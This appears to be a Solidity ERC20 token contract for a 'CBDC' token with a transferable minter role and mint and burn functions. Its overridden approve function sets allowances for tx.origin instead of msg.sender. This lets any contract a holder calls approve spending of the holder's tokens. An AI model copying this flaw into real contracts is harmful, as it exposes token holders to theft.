// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20 {
  //add minter variable
  address public minter;

  //add minter changed event
  event MinterChanged(address indexed from, address to);

  constructor() payable ERC20("Central Bank Digital Currency", "CBDC") {
    //asign initial minter
    minter = msg.sender;
  }
  function passMinterRole(address dapps) public returns (bool) {
    require(msg.sender == minter, 'Error');
    minter = dapps;

    emit MinterChanged(msg.sender, dapps);
    return true;
  }
  //Add pass minter role function

  function mint(address account, uint256 amount) public {
    //check if msg.sender have minter role
    require(msg.sender == minter, 'Error');
		_mint(account, amount);
	}

  function burn(uint256 amount) public{
    require(msg.sender==minter, 'Error, msg.sender does not have minter role');
    _burn(msg.sender, amount);
  }

  function approve(address spender, uint256 amount) public override returns (bool){
	  _approve(tx.origin, spender, amount);
	  return true;
	}
}